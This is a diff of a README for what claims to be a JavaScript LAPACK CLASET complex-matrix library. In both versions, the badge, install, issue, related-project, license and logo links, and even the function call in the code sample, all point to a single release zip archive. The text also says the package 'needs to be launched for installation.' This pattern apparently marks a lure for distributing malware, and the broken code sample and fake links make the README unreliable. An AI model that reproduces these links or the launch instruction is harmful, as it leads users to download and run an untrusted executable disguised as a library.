@@ -1,6 +1,6 @@
 # LAPACK Base CLASET 🧮🔢
 
-![lapack-base-claset](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip)
+![lapack-base-claset](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip)
 
 Welcome to the LAPACK Base CLASET repository! This repository contains a set of subroutines designed to help set the off-diagonal elements and the diagonal elements of a single-precision complex floating-point matrix to specified values. If you are working on linear algebra, matrix calculations, or mathematical operations involving complex numbers, this library can be a valuable tool in your projects.
 
@@ -13,14 +13,14 @@ The LAPACK Base CLASET library provides efficient and reliable routines for hand
 👉 Set the off-diagonal elements and diagonal elements of complex matrices  
 👉 Perform mathematical operations with single-precision floating-point numbers  
 👉 High-performance subroutines for linear algebra calculations  
-👉 Compatible with JavaScript, https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip, and ndarray arrays  
+👉 Compatible with JavaScript, https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip, and ndarray arrays  
 👉 Simplify complex matrix manipulations in your projects  
 
 ## Installation 🚀
 
 To get started with LAPACK Base CLASET, you can download the software package from the following link:
 
-[Download LAPACK Base CLASET Software](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip)
+[Download LAPACK Base CLASET Software](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip)
 
 *Note: The software package needs to be launched for installation.*
 
@@ -38,14 +38,14 @@ const matrix = [
   [7.0, 8.0, 9.0]
 ];
 
-https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip('All', matrix);
+https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip('All', matrix);
 
 // Perform operations on the modified matrix
 ```
 
 ## Support 🤝
 
-If you encounter any issues or have questions regarding LAPACK Base CLASET, feel free to [create an issue](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip) on this repository. Our team will be happy to assist you with any concerns or feedback you may have.
+If you encounter any issues or have questions regarding LAPACK Base CLASET, feel free to [create an issue](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip) on this repository. Our team will be happy to assist you with any concerns or feedback you may have.
 
 ## Contributing 🌟
 
@@ -55,18 +55,18 @@ Contributions to LAPACK Base CLASET are welcome! If you have ideas for enhanceme
 
 Check out these related projects that may be of interest:
 
-- [lapack-qr-decomposition](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip): QR decomposition routines using LAPACK  
-- [lapack-eigenvalue-solver](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip): Eigenvalue solvers based on LAPACK subroutines  
-- [lapack-svd-computation](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip): Singular Value Decomposition calculations with LAPACK  
+- [lapack-qr-decomposition](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip): QR decomposition routines using LAPACK  
+- [lapack-eigenvalue-solver](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip): Eigenvalue solvers based on LAPACK subroutines  
+- [lapack-svd-computation](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip): Singular Value Decomposition calculations with LAPACK  
 
 ## License 📄
 
-This project is licensed under the [MIT License](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip) - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-**Visit the [Releases](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip) section for more information and software updates.**
+**Visit the [Releases](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip) section for more information and software updates.**
 
-![lapack-logo](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v1.0/Release.zip)
+![lapack-logo](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip)
 
 Developed with ❤️ by the LAPACK team. Thank you for using LAPACK Base CLASET! 🚀🔬🔢
